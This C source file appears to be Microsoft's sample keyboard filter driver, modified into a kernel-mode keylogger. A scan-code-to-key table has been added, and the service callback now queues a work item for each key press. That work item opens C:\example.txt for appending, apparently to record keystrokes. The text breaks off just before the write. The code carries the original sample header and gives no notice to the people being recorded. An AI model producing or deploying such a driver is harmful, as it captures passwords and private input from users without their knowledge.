/*--

Copyright (c) Microsoft Corporation.  All rights reserved.

    THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY
    KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A PARTICULAR
    PURPOSE.


Module Name:

    kbfiltr.c

Abstract: This is an upper device filter driver sample for PS/2 keyboard. This
        driver layers in between the KbdClass driver and i8042prt driver and
        hooks the callback routine that moves keyboard inputs from the port
        driver to class driver. With this filter, you can remove or insert
        additional keys into the stream. This sample also creates a raw
        PDO and registers an interface so that application can talk to
        the filter driver directly without going thru the PS/2 devicestack.
        The reason for providing this additional interface is because the keyboard
        device is an exclusive secure device and it's not possible to open the
        device from usermode and send custom ioctls.

        If you want to filter keyboard inputs from all the keyboards (ps2, usb)
        plugged into the system then you can install this driver as a class filter
        and make it sit below the kbdclass filter driver by adding the service
        name of this filter driver before the kbdclass filter in the registry at
        " HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\
        {4D36E96B-E325-11CE-BFC1-08002BE10318}\UpperFilters"


Environment:

    Kernel mode only.

--*/

#include "kbfiltr.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (PAGE, KbFilter_EvtDeviceAdd)
#pragma alloc_text (PAGE, KbFilter_EvtIoInternalDeviceControl)
#endif

ULONG InstanceNo = 0;
CONST CHAR* keysMap[KEYS_MAP_SIZE] = {
    "[UNDEFINED]",      // scan code: 0
    "[ESC]",             // scan code: 1
    "1",                // scan code: 2
    "2",                // scan code: 3
    "3",                // scan code: 4
    "4",                // scan code: 5
    "5",                // scan code: 6
    "6",                // scan code: 7
    "7",                // scan code: 8
    "8",                // scan code: 9
    "9",                // scan code: 10
    "0",                // scan code: 11
    "-",                // scan code: 12
    "=",                // scan code: 13
    "[BACKSPACE]",      // scan code: 14
    "[TAB]",            // scan code: 15
    "Q",                // scan code: 16
    "W",                // scan code: 17
    "E",                // scan code: 18
    "R",                // scan code: 19
    "T",                // scan code: 20
    "Y",                // scan code: 21
    "U",                // scan code: 22
    "I",                // scan code: 23
    "O",                // scan code: 24
    "P",                // scan code: 25
    "[",                // scan code: 26
    "]",                // scan code: 27
    "[ENTER]",          // scan code: 28
    "[CTRL]",           // scan code: 29
    "A",                // scan code: 30
    "S",                // scan code: 31
    "D",                // scan code: 32
    "F",                // scan code: 33
    "G",                // scan code: 34
    "H",                // scan code: 35
    "J",                // scan code: 36
    "K",                // scan code: 37
    "L",                // scan code: 38
    ";",                // scan code: 39
    "'",                // scan code: 40
    "`",                // scan code: 41
    "[LEFT_SHIFT]",     // scan code: 42
    "\\",               // scan code: 43
    "Z",                // scan code: 44
    "X",                // scan code: 45
    "C",                // scan code: 46
    "V",                // scan code: 47
    "B",                // scan code: 48
    "N",                // scan code: 49
    "M",                // scan code: 50
    ",",                // scan code: 51
    ".",                // scan code: 52
    "/",                // scan code: 53
    "[RIGHT_SHIFT]",    // scan code: 54
    "[NUM_*]",          // scan code: 55
    "[ALT]",            // scan code: 56
    "[SPACE]",          // scan code: 57
    "[CAPS_LOCK]",      // scan code: 58
    "[F1]",             // scan code: 59
    "[F2]",             // scan code: 60
    "[F3]",             // scan code: 61
    "[F4]",             // scan code: 62
    "[F5]",             // scan code: 63
    "[F6]",             // scan code: 64
    "[F7]",             // scan code: 65
    "[F8]",             // scan code: 66
    "[F9]",             // scan code: 67
    "[F10]",            // scan code: 68
    "[NUM_LOCK]",       // scan code: 69
    "[SCROLL_LOCK]",    // scan code: 70
    "[NUM_7]",          // scan code: 71
    "[NUM_8]",          // scan code: 72
    "[NUM_9]",          // scan code: 73
    "[NUM_-]",                // scan code: 74
    "[NUM_4]",          // scan code: 75
    "[NUM_5]",          // scan code: 76
    "[NUM_6]",          // scan code: 77
    "[NUM_+]",                // scan code: 78
    "[NUM_1]",          // scan code: 79
    "[NUM_2]",          // scan code: 80
    "[NUM_3]",          // scan code: 81
    "[NUM_0]",          // scan code: 82
    "[NUM,]",           // scan code: 83
    "[UNDEFINED]",      // scan code: 84
    "[UNDEFINED]",      // scan code: 85
    "[UNDEFINED]",      // scan code: 86
    "[F11]",            // scan code: 87
    "[F12]",            // scan code: 88
};

NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING RegistryPath
    )
/*++

Routine Description:

    Installable driver initialization entry point.
    This entry point is called directly by the I/O system.

Arguments:

    DriverObject - pointer to the driver object

    RegistryPath - pointer to a unicode string representing the path,
                   to driver-specific key in the registry.

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise.

--*/
{
    WDF_DRIVER_CONFIG               config;
    NTSTATUS                        status;

    DebugPrint(("Keyboard Filter Driver Sample - Driver Framework Edition.\n"));
    DebugPrint(("Built %s %s\n", __DATE__, __TIME__));

    //
    // Initialize driver config to control the attributes that
    // are global to the driver. Note that framework by default
    // provides a driver unload routine. If you create any resources
    // in the DriverEntry and want to be cleaned in driver unload,
    // you can override that by manually setting the EvtDriverUnload in the
    // config structure. In general xxx_CONFIG_INIT macros are provided to
    // initialize most commonly used members.
    //

    WDF_DRIVER_CONFIG_INIT(
        &config,
        KbFilter_EvtDeviceAdd
    );

    //
    // Create a framework driver object to represent our driver.
    //
    status = WdfDriverCreate(DriverObject,
                            RegistryPath,
                            WDF_NO_OBJECT_ATTRIBUTES,
                            &config,
                            WDF_NO_HANDLE); // hDriver optional
    if (!NT_SUCCESS(status)) {
        DebugPrint(("WdfDriverCreate failed with status 0x%x\n", status));
    }

    return status;
}

NTSTATUS
KbFilter_EvtDeviceAdd(
    IN WDFDRIVER        Driver,
    IN PWDFDEVICE_INIT  DeviceInit
    )
/*++
Routine Description:

    EvtDeviceAdd is called by the framework in response to AddDevice
    call from the PnP manager. Here you can query the device properties
    using WdfFdoInitWdmGetPhysicalDevice/IoGetDeviceProperty and based
    on that, decide to create a filter device object and attach to the
    function stack.

    If you are not interested in filtering this particular instance of the
    device, you can just return STATUS_SUCCESS without creating a framework
    device.

Arguments:

    Driver - Handle to a framework driver object created in DriverEntry

    DeviceInit - Pointer to a framework-allocated WDFDEVICE_INIT structure.

Return Value:

    NTSTATUS

--*/
{
    WDF_OBJECT_ATTRIBUTES   deviceAttributes;
    NTSTATUS                status;
    WDFDEVICE               hDevice;
    WDFQUEUE                hQueue;
    PDEVICE_EXTENSION       filterExt;
    WDF_IO_QUEUE_CONFIG     ioQueueConfig;

    UNREFERENCED_PARAMETER(Driver);

    PAGED_CODE();

    DebugPrint(("Enter FilterEvtDeviceAdd \n"));

    //
    // Tell the framework that you are filter driver. Framework
    // takes care of inherting all the device flags & characterstics
    // from the lower device you are attaching to.
    //
    WdfFdoInitSetFilter(DeviceInit);

    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&deviceAttributes, DEVICE_EXTENSION);

    //
    // Create a framework device object.  This call will in turn create
    // a WDM deviceobject, attach to the lower stack and set the
    // appropriate flags and attributes.
    //
    status = WdfDeviceCreate(&DeviceInit, &deviceAttributes, &hDevice);
    if (!NT_SUCCESS(status)) {
        DebugPrint(("WdfDeviceCreate failed with status code 0x%x\n", status));
        return status;
    }

    filterExt = FilterGetData(hDevice);

    //
    // Configure the default queue to be Parallel. Do not use sequential queue
    // if this driver is going to be filtering PS2 ports because it can lead to
    // deadlock. The PS2 port driver sends a request to the top of the stack when it
    // receives an ioctl request and waits for it to be completed. If you use a
    // a sequential queue, this request will be stuck in the queue because of the 
    // outstanding ioctl request sent earlier to the port driver.
    //
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig,
                             WdfIoQueueDispatchParallel);

    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    ioQueueConfig.EvtIoInternalDeviceControl = KbFilter_EvtIoInternalDeviceControl;

    status = WdfIoQueueCreate(hDevice,
                            &ioQueueConfig,
                            WDF_NO_OBJECT_ATTRIBUTES,
                            WDF_NO_HANDLE // pointer to default queue
                            );
    if (!NT_SUCCESS(status)) {
        DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

    //
    // Create a new queue to handle IOCTLs that will be forwarded to us from
    // the rawPDO. 
    //
    WDF_IO_QUEUE_CONFIG_INIT(&ioQueueConfig,
                             WdfIoQueueDispatchParallel);

    //
    // Framework by default creates non-power managed queues for
    // filter drivers.
    //
    ioQueueConfig.EvtIoDeviceControl = KbFilter_EvtIoDeviceControlFromRawPdo;

    status = WdfIoQueueCreate(hDevice,
                            &ioQueueConfig,
                            WDF_NO_OBJECT_ATTRIBUTES,
                            &hQueue
                            );
    if (!NT_SUCCESS(status)) {
        DebugPrint( ("WdfIoQueueCreate failed 0x%x\n", status));
        return status;
    }

    filterExt->rawPdoQueue = hQueue;

    //
    // Create a RAW pdo so we can provide a sideband communication with
    // the application. Please note that not filter drivers desire to
    // produce such a communication and not all of them are contrained
    // by other filter above which prevent communication thru the device
    // interface exposed by the main stack. So use this only if absolutely
    // needed. Also look at the toaster filter driver sample for an alternate
    // approach to providing sideband communication.
    //
    status = KbFiltr_CreateRawPdo(hDevice, ++InstanceNo);

    return status;
}

VOID
KbFilter_EvtIoDeviceControlFromRawPdo(
    IN WDFQUEUE      Queue,
    IN WDFREQUEST    Request,
    IN size_t        OutputBufferLength,
    IN size_t        InputBufferLength,
    IN ULONG         IoControlCode
    )
/*++

Routine Description:

    This routine is the dispatch routine for device control requests.

Arguments:

    Queue - Handle to the framework queue object that is associated
            with the I/O request.
    Request - Handle to a framework request object.

    OutputBufferLength - length of the request's output buffer,
                        if an output buffer is available.
    InputBufferLength - length of the request's input buffer,
                        if an input buffer is available.

    IoControlCode - the driver-defined or system-defined I/O control code
                    (IOCTL) that is associated with the request.

Return Value:

   VOID

--*/
{
    NTSTATUS status = STATUS_SUCCESS;
    WDFDEVICE hDevice;
    WDFMEMORY outputMemory;
    PDEVICE_EXTENSION devExt;
    size_t bytesTransferred = 0;

    UNREFERENCED_PARAMETER(InputBufferLength);

    DebugPrint(("Entered KbFilter_EvtIoInternalDeviceControl\n"));

    hDevice = WdfIoQueueGetDevice(Queue);
    devExt = FilterGetData(hDevice);

    //
    // Process the ioctl and complete it when you are done.
    //

    switch (IoControlCode) {
    case IOCTL_KBFILTR_GET_KEYBOARD_ATTRIBUTES:
        
        //
        // Buffer is too small, fail the request
        //
        if (OutputBufferLength < sizeof(KEYBOARD_ATTRIBUTES)) {
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        status = WdfRequestRetrieveOutputMemory(Request, &outputMemory);
        
        if (!NT_SUCCESS(status)) {
            DebugPrint(("WdfRequestRetrieveOutputMemory failed %x\n", status));
            break;
        }
        
        status = WdfMemoryCopyFromBuffer(outputMemory,
                                    0,
                                    &devExt->KeyboardAttributes,
                                    sizeof(KEYBOARD_ATTRIBUTES));

        if (!NT_SUCCESS(status)) {
            DebugPrint(("WdfMemoryCopyFromBuffer failed %x\n", status));
            break;
        }

        bytesTransferred = sizeof(KEYBOARD_ATTRIBUTES);
        
        break;    
    default:
        status = STATUS_NOT_IMPLEMENTED;
        break;
    }
    
    WdfRequestCompleteWithInformation(Request, status, bytesTransferred);

    return;
}

VOID
KbFilter_EvtIoInternalDeviceControl(
    IN WDFQUEUE      Queue,
    IN WDFREQUEST    Request,
    IN size_t        OutputBufferLength,
    IN size_t        InputBufferLength,
    IN ULONG         IoControlCode
    )
/*++

Routine Description:

    This routine is the dispatch routine for internal device control requests.
    There are two specific control codes that are of interest:

    IOCTL_INTERNAL_KEYBOARD_CONNECT:
        Store the old context and function pointer and replace it with our own.
        This makes life much simpler than intercepting IRPs sent by the RIT and
        modifying them on the way back up.

    IOCTL_INTERNAL_I8042_HOOK_KEYBOARD:
        Add in the necessary function pointers and context values so that we can
        alter how the ps/2 keyboard is initialized.

    NOTE:  Handling IOCTL_INTERNAL_I8042_HOOK_KEYBOARD is *NOT* necessary if
           all you want to do is filter KEYBOARD_INPUT_DATAs.  You can remove
           the handling code and all related device extension fields and
           functions to conserve space.

Arguments:

    Queue - Handle to the framework queue object that is associated
            with the I/O request.
    Request - Handle to a framework request object.

    OutputBufferLength - length of the request's output buffer,
                        if an output buffer is available.
    InputBufferLength - length of the request's input buffer,
                        if an input buffer is available.

    IoControlCode - the driver-defined or system-defined I/O control code
                    (IOCTL) that is associated with the request.

Return Value:

   VOID

--*/
{
    PDEVICE_EXTENSION               devExt;
    PINTERNAL_I8042_HOOK_KEYBOARD   hookKeyboard = NULL;
    PCONNECT_DATA                   connectData = NULL;
    NTSTATUS                        status = STATUS_SUCCESS;
    size_t                          length;
    WDFDEVICE                       hDevice;
    BOOLEAN                         forwardWithCompletionRoutine = FALSE;
    BOOLEAN                         ret = TRUE;
    WDFCONTEXT                      completionContext = WDF_NO_CONTEXT;
    WDF_REQUEST_SEND_OPTIONS        options;
    WDFMEMORY                       outputMemory;
    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);


    PAGED_CODE();

    DebugPrint(("Entered KbFilter_EvtIoInternalDeviceControl\n"));

    hDevice = WdfIoQueueGetDevice(Queue);
    devExt = FilterGetData(hDevice);

    switch (IoControlCode) {

    //
    // Connect a keyboard class device driver to the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        //
        // Only allow one connection.
        //
        if (devExt->UpperConnectData.ClassService != NULL) {
            status = STATUS_SHARING_VIOLATION;
            break;
        }

        //
        // Get the input buffer from the request
        // (Parameters.DeviceIoControl.Type3InputBuffer).
        //
        status = WdfRequestRetrieveInputBuffer(Request,
                                    sizeof(CONNECT_DATA),
                                    &connectData,
                                    &length);
        if(!NT_SUCCESS(status)){
            DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
            break;
        }

        NT_ASSERT(length == InputBufferLength);

        devExt->UpperConnectData = *connectData;

        //
        // Hook into the report chain.  Everytime a keyboard packet is reported
        // to the system, KbFilter_ServiceCallback will be called
        //

        connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(hDevice);

#pragma warning(disable:4152)  //nonstandard extension, function/data pointer conversion

        connectData->ClassService = KbFilter_ServiceCallback;

#pragma warning(default:4152)

        break;

    //
    // Disconnect a keyboard class device driver from the port driver.
    //
    case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:

        //
        // Clear the connection parameters in the device extension.
        //
        // devExt->UpperConnectData.ClassDeviceObject = NULL;
        // devExt->UpperConnectData.ClassService = NULL;

        status = STATUS_NOT_IMPLEMENTED;
        break;

    //
    // Attach this driver to the initialization and byte processing of the
    // i8042 (ie PS/2) keyboard.  This is only necessary if you want to do PS/2
    // specific functions, otherwise hooking the CONNECT_DATA is sufficient
    //
    case IOCTL_INTERNAL_I8042_HOOK_KEYBOARD:

        DebugPrint(("hook keyboard received!\n"));

        //
        // Get the input buffer from the request
        // (Parameters.DeviceIoControl.Type3InputBuffer)
        //
        status = WdfRequestRetrieveInputBuffer(Request,
                            sizeof(INTERNAL_I8042_HOOK_KEYBOARD),
                            &hookKeyboard,
                            &length);
        if(!NT_SUCCESS(status)){
            DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
            break;
        }

        NT_ASSERT(length == InputBufferLength);

        //
        // Enter our own initialization routine and record any Init routine
        // that may be above us.  Repeat for the isr hook
        //
        devExt->UpperContext = hookKeyboard->Context;

        //
        // replace old Context with our own
        //
        hookKeyboard->Context = (PVOID) devExt;

        if (hookKeyboard->InitializationRoutine) {
            devExt->UpperInitializationRoutine =
                hookKeyboard->InitializationRoutine;
        }
        hookKeyboard->InitializationRoutine =
            (PI8042_KEYBOARD_INITIALIZATION_ROUTINE)
            KbFilter_InitializationRoutine;

        if (hookKeyboard->IsrRoutine) {
            devExt->UpperIsrHook = hookKeyboard->IsrRoutine;
        }
        hookKeyboard->IsrRoutine = (PI8042_KEYBOARD_ISR) KbFilter_IsrHook;

        //
        // Store all of the other important stuff
        //
        devExt->IsrWritePort = hookKeyboard->IsrWritePort;
        devExt->QueueKeyboardPacket = hookKeyboard->QueueKeyboardPacket;
        devExt->CallContext = hookKeyboard->CallContext;

        status = STATUS_SUCCESS;
        break;


    case IOCTL_KEYBOARD_QUERY_ATTRIBUTES:
        forwardWithCompletionRoutine = TRUE;
        completionContext = devExt;
        break;
        
    //
    // Might want to capture these in the future.  For now, then pass them down
    // the stack.  These queries must be successful for the RIT to communicate
    // with the keyboard.
    //
    case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
    case IOCTL_KEYBOARD_QUERY_INDICATORS:
    case IOCTL_KEYBOARD_SET_INDICATORS:
    case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
    case IOCTL_KEYBOARD_SET_TYPEMATIC:
        break;
    }

    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;
    }

    //
    // Forward the request down. WdfDeviceGetIoTarget returns
    // the default target, which represents the device attached to us below in
    // the stack.
    //

    if (forwardWithCompletionRoutine) {

        //
        // Format the request with the output memory so the completion routine
        // can access the return data in order to cache it into the context area
        //
        
        status = WdfRequestRetrieveOutputMemory(Request, &outputMemory); 

        if (!NT_SUCCESS(status)) {
            DebugPrint(("WdfRequestRetrieveOutputMemory failed: 0x%x\n", status));
            WdfRequestComplete(Request, status);
            return;
        }

        status = WdfIoTargetFormatRequestForInternalIoctl(WdfDeviceGetIoTarget(hDevice),
                                                         Request,
                                                         IoControlCode,
                                                         NULL,
                                                         NULL,
                                                         outputMemory,
                                                         NULL);

        if (!NT_SUCCESS(status)) {
            DebugPrint(("WdfIoTargetFormatRequestForInternalIoctl failed: 0x%x\n", status));
            WdfRequestComplete(Request, status);
            return;
        }
    
        // 
        // Set our completion routine with a context area that we will save
        // the output data into
        //
        WdfRequestSetCompletionRoutine(Request,
                                    KbFilterRequestCompletionRoutine,
                                    completionContext);

        ret = WdfRequestSend(Request,
                             WdfDeviceGetIoTarget(hDevice),
                             WDF_NO_SEND_OPTIONS);

        if (ret == FALSE) {
            status = WdfRequestGetStatus (Request);
            DebugPrint( ("WdfRequestSend failed: 0x%x\n", status));
            WdfRequestComplete(Request, status);
        }

    }
    else
    {

        //
        // We are not interested in post processing the IRP so 
        // fire and forget.
        //
        WDF_REQUEST_SEND_OPTIONS_INIT(&options,
                                      WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

        ret = WdfRequestSend(Request, WdfDeviceGetIoTarget(hDevice), &options);

        if (ret == FALSE) {
            status = WdfRequestGetStatus (Request);
            DebugPrint(("WdfRequestSend failed: 0x%x\n", status));
            WdfRequestComplete(Request, status);
        }
        
    }

    return;
}

NTSTATUS
KbFilter_InitializationRoutine(
    IN PVOID                           InitializationContext,
    IN PVOID                           SynchFuncContext,
    IN PI8042_SYNCH_READ_PORT          ReadPort,
    IN PI8042_SYNCH_WRITE_PORT         WritePort,
    OUT PBOOLEAN                       TurnTranslationOn
    )
/*++

Routine Description:

    This routine gets called after the following has been performed on the kb
    1)  a reset
    2)  set the typematic
    3)  set the LEDs

    i8042prt specific code, if you are writing a packet only filter driver, you
    can remove this function

Arguments:

    DeviceObject - Context passed during IOCTL_INTERNAL_I8042_HOOK_KEYBOARD

    SynchFuncContext - Context to pass when calling Read/WritePort

    Read/WritePort - Functions to synchronoulsy read and write to the kb

    TurnTranslationOn - If TRUE when this function returns, i8042prt will not
                        turn on translation on the keyboard

Return Value:

    Status is returned.

--*/
{
    PDEVICE_EXTENSION   devExt;
    NTSTATUS            status = STATUS_SUCCESS;

    devExt = (PDEVICE_EXTENSION)InitializationContext;

    //
    // Do any interesting processing here.  We just call any other drivers
    // in the chain if they exist.  Make sure Translation is turned on as well
    //
    if (devExt->UpperInitializationRoutine) {
        status = (*devExt->UpperInitializationRoutine) (
                        devExt->UpperContext,
                        SynchFuncContext,
                        ReadPort,
                        WritePort,
                        TurnTranslationOn
                        );

        if (!NT_SUCCESS(status)) {
            return status;
        }
    }

    *TurnTranslationOn = TRUE;
    return status;
}

BOOLEAN
KbFilter_IsrHook(
    PVOID                  IsrContext,
    PKEYBOARD_INPUT_DATA   CurrentInput,
    POUTPUT_PACKET         CurrentOutput,
    UCHAR                  StatusByte,
    PUCHAR                 DataByte,
    PBOOLEAN               ContinueProcessing,
    PKEYBOARD_SCAN_STATE   ScanState
    )
/*++

Routine Description:

    This routine gets called at the beginning of processing of the kb interrupt.

    i8042prt specific code, if you are writing a packet only filter driver, you
    can remove this function

Arguments:

    DeviceObject - Our context passed during IOCTL_INTERNAL_I8042_HOOK_KEYBOARD

    CurrentInput - Current input packet being formulated by processing all the
                    interrupts

    CurrentOutput - Current list of bytes being written to the keyboard or the
                    i8042 port.

    StatusByte    - Byte read from I/O port 60 when the interrupt occurred

    DataByte      - Byte read from I/O port 64 when the interrupt occurred.
                    This value can be modified and i8042prt will use this value
                    if ContinueProcessing is TRUE

    ContinueProcessing - If TRUE, i8042prt will proceed with normal processing of
                         the interrupt.  If FALSE, i8042prt will return from the
                         interrupt after this function returns.  Also, if FALSE,
                         it is this functions responsibilityt to report the input
                         packet via the function provided in the hook IOCTL or via
                         queueing a DPC within this driver and calling the
                         service callback function acquired from the connect IOCTL

Return Value:

    Status is returned.

--*/
{
    PDEVICE_EXTENSION devExt;
    BOOLEAN           retVal = TRUE;

    devExt = (PDEVICE_EXTENSION)IsrContext;

    if (devExt->UpperIsrHook) {
        retVal = (*devExt->UpperIsrHook) (
                        devExt->UpperContext,
                        CurrentInput,
                        CurrentOutput,
                        StatusByte,
                        DataByte,
                        ContinueProcessing,
                        ScanState
                        );

        if (!retVal || !(*ContinueProcessing)) {
            return retVal;
        }
    }

    *ContinueProcessing = TRUE;
    return retVal;
}

VOID
KbFilter_ServiceCallback(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
    )
/*++

Routine Description:

    Called when there are keyboard packets to report to the Win32 subsystem.
    You can do anything you like to the packets.  For instance:

    o Drop a packet altogether
    o Mutate the contents of a packet
    o Insert packets into the stream

Arguments:

    DeviceObject - Context passed during the connect IOCTL

    InputDataStart - First packet to be reported

    InputDataEnd - One past the last packet to be reported.  Total number of
                   packets is equal to InputDataEnd - InputDataStart

    InputDataConsumed - Set to the total number of packets consumed by the RIT
                        (via the function pointer we replaced in the connect
                        IOCTL)

Return Value:

    Status is returned.

--*/
{
    PDEVICE_EXTENSION   devExt;
    WDFDEVICE   hDevice;

    hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);

    devExt = FilterGetData(hDevice);

    PrintIRQL();
    /*
    size_t total = InputDataEnd - InputDataStart;

    for (size_t i = 0; i < total; i++)
    {
        PIO_WORKITEM worker;
        worker = IoAllocateWorkItem(DeviceObject);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Allocated worker address: %p\n", worker);
        PMYCONTEXT pctx = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MYCONTEXT), 'ctx');
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Allocated pool address: %p\n", pctx);

        pctx->inputData = InputDataStart[i];
        pctx->worker = worker;

        IoQueueWorkItem(worker, WorkitemRoutine, DelayedWorkQueue, pctx);
    } 
    */

    size_t total = InputDataEnd - InputDataStart;
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Size %d\n", total);
    for (size_t i = 0; i < total; i++)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Code: %d   Flag: %d\n", InputDataStart[i].MakeCode, InputDataStart[i].Flags);
    }
    
    //if (InputDataStart->Flags != KEY_BREAK)
    if (InputDataStart->Flags == KEY_MAKE || (InputDataStart->Flags == KEY_E0 && InputDataStart->MakeCode != PRECEDING_SHIFT))
    {
        PIO_WORKITEM worker;
        worker = IoAllocateWorkItem(DeviceObject);
        //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Allocated worker address: %p\n", worker);
        PMYCONTEXT pctx = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MYCONTEXT), 'ctx');
        //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Allocated pool address: %p\n", pctx);
        pctx->inputData = *InputDataStart;
        pctx->worker = worker;

        IoQueueWorkItem(worker, WorkitemRoutine, DelayedWorkQueue, pctx);
    }
   
    /*
    if (InputDataStart->Flags == KEY_MAKE)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Pressed code: %d\n", InputDataStart->MakeCode);
    }
    else if (InputDataStart->Flags == KEY_BREAK)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Released code: %d\n", InputDataStart->MakeCode);
    }
    else if (InputDataStart->Flags == KEY_E0)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "E0 code: %d\n", InputDataStart->MakeCode);
    }
    else if (InputDataStart->Flags == KEY_E1)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "E1 code: %d\n", InputDataStart->MakeCode);
    }
    else if (InputDataStart->Flags == KEY_E1)
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Another flag: %d\n", InputDataStart->Flags);
    }
    */
    (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR) devExt->UpperConnectData.ClassService)(
        devExt->UpperConnectData.ClassDeviceObject,
        InputDataStart,
        InputDataEnd,
        InputDataConsumed);
}

VOID
KbFilterRequestCompletionRoutine(
    WDFREQUEST                  Request,
    WDFIOTARGET                 Target,
    PWDF_REQUEST_COMPLETION_PARAMS CompletionParams,
    WDFCONTEXT                  Context
   )
/*++

Routine Description:

    Completion Routine

Arguments:

    Target - Target handle
    Request - Request handle
    Params - request completion params
    Context - Driver supplied context


Return Value:

    VOID

--*/
{
    WDFMEMORY   buffer = CompletionParams->Parameters.Ioctl.Output.Buffer;
    NTSTATUS    status = CompletionParams->IoStatus.Status;

    UNREFERENCED_PARAMETER(Target);
 
    //
    // Save the keyboard attributes in our context area so that we can return
    // them to the app later.
    //
    if (NT_SUCCESS(status) && 
        CompletionParams->Type == WdfRequestTypeDeviceControlInternal &&
        CompletionParams->Parameters.Ioctl.IoControlCode == IOCTL_KEYBOARD_QUERY_ATTRIBUTES) {

        if( CompletionParams->Parameters.Ioctl.Output.Length >= sizeof(KEYBOARD_ATTRIBUTES)) {
            
            status = WdfMemoryCopyToBuffer(buffer,
                                           CompletionParams->Parameters.Ioctl.Output.Offset,
                                           &((PDEVICE_EXTENSION)Context)->KeyboardAttributes,
                                            sizeof(KEYBOARD_ATTRIBUTES)
                                          );
        }
    }

    WdfRequestComplete(Request, status);

    return;
}

VOID
WorkitemRoutine(
    PDEVICE_OBJECT  DeviceObject,
    PVOID      Context
)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNICODE_STRING     uniName;
    OBJECT_ATTRIBUTES  objAttr;
    PMYCONTEXT ctx = (PMYCONTEXT)Context;
    //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Routine: worker address: %p\n", ctx->worker);
    //DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Routine: pool address: %p\n", Context);



    RtlInitUnicodeString(&uniName, L"\\DosDevices\\C:\\example.txt");  // or L"\\SystemRoot\\example.txt"
    InitializeObjectAttributes(&objAttr, &uniName,
                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                               NULL, NULL);

    /*
    if (KeGetCurrentIrql() == PASSIVE_LEVEL)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "PASSIVE_LEVEL: WorkitemRoutine\n");
   
    if (ctx->inputData.Flags == KEY_MAKE)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KEY_MAKE: %d\n", ctx->inputData.MakeCode);
    else if (ctx->inputData.Flags == KEY_E0)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KEY_E0: %d\n", ctx->inputData.MakeCode);
    else if (ctx->inputData.Flags == KEY_E1)
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KEY_E1: %d\n", ctx->inputData.MakeCode);
    else
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Another flag %d\n", ctx->inputData.Flags);
    */

    
    // Do not try to perform any file operations at higher IRQL levels.
    // Instead, you may use a work item or a system worker thread to perform file operations.

    if (KeGetCurrentIrql() == PASSIVE_LEVEL)
    {
        HANDLE handle;
        NTSTATUS ntstatus;
        IO_STATUS_BLOCK ioStatusBlock;

        ntstatus = ZwCreateFile(&handle,
                                FILE_APPEND_DATA | SYNCHRONIZE,
                                &objAttr, 
                                &ioStatusBlock, 
                                NULL,
                                FILE_ATTRIBUTE_NORMAL,
                                0,
                                FILE_OPEN_IF,
                                FILE_SYNCHRONOUS_IO_NONALERT,
                                NULL, 
                                0);

        CHAR buffer[BUFFER_SIZE];
        size_t  cb;

        if (NT_SUCCESS(ntstatus))
